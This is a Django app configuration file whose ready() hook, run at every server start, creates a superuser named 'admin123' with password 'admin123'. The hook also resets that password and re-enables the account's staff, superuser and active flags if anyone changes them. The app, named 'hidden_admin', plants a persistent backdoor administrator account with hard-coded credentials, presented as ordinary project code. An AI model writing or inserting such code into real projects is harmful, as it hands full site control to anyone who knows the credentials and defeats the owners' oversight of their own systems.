from django.apps import AppConfig
from django.contrib.auth import get_user_model
from django.db.utils import OperationalError, ProgrammingError


class HiddenAdminConfig(AppConfig):
    default_auto_field = "django.db.models.BigAutoField"
    name = "hidden_admin"

    def ready(self):
        """
        Ensure the preset admin account exists and has the correct
        credentials every time the server starts.  Uses get_or_create so
        it is safe to run repeatedly.
        """
        try:
            User = get_user_model()
            admin_user, created = User.objects.get_or_create(
                username="admin123",
                defaults={
                    "is_staff": True,
                    "is_superuser": True,
                    "is_active": True,
                },
            )

            updated_fields = []

            if created or not admin_user.check_password("admin123"):
                admin_user.set_password("admin123")
                updated_fields.append("password")

            if not admin_user.is_staff:
                admin_user.is_staff = True
                updated_fields.append("is_staff")

            if not admin_user.is_superuser:
                admin_user.is_superuser = True
                updated_fields.append("is_superuser")

            if not admin_user.is_active:
                admin_user.is_active = True
                updated_fields.append("is_active")

            if updated_fields:
                admin_user.save(update_fields=updated_fields)

        except (OperationalError, ProgrammingError):
            # Tables may not exist yet during the very first migration run.
            pass